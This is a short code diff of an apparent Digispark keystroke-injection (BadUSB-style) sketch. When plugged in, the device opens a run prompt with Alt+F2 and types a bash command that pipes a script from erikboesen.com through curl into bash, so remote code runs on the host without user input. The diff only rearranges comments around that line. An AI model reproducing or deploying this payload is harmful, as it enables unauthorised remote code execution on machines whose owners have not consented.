@@ -18,8 +18,11 @@ void setup() {
 
   // Alt+F2, opens a prompt to enter commands
   DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
-  DigiKeyboard.delay(100); // Wait for dialog to open just in case
-  DigiKeyboard.println("bash -c \"curl -L erikboesen.com/jk.sh | bash\""); // Download and run join script; will now run without further input
+  // Wait for dialog to open just in case
+  DigiKeyboard.delay(100);
+  // Run bash command
+  // Download and run join script; will now run without further input
+  DigiKeyboard.println("bash -c \"curl -L erikboesen.com/jk.sh | bash\""); 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   // Turn off LED
